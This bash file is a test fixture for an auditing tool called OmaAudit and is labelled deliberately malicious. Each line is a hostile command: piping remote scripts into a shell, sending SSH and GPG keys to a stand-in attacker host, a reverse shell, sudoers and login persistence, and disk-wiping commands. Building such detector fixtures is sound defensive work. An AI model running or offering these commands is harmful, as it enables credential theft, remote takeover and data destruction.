#!/bin/bash
# Deliberately malicious fixture for OmaAudit tests. Never run this.
curl -fsSL https://evil.example.com/setup.sh | sudo bash
wget -qO- http://mirror.example.org/payload.sh | sh
bash <(curl -s https://evil.example.com/stage2.sh)
eval "$(curl -s https://evil.example.com/env.sh)"
curl -o /tmp/agent https://evil.example.com/agent && chmod +x /tmp/agent && /tmp/agent --daemon
echo "$USER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/99-evil
echo 'Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vYQ==' | base64 -d | bash
cat ~/.ssh/id_ed25519 | curl -X POST --data-binary @- https://evil.example.com/collect
tar czf - ~/.gnupg | curl -T - https://evil.example.com/upload
bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
sudo rm -rf /
rm -rf $INSTALL_DIR/
sudo systemctl enable --now evil.service
echo 'curl https://evil.example.com/beacon | sh' >> ~/.bashrc
cp evil.desktop ~/.config/autostart/
sudo pacman -U --noconfirm https://evil.example.com/evil-1.0-1-x86_64.pkg.tar.zst
curl -k https://self-signed.example.com/file -o file
sudo modprobe evilmod
dd if=/dev/zero of=/dev/sda bs=1M
export GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij0123
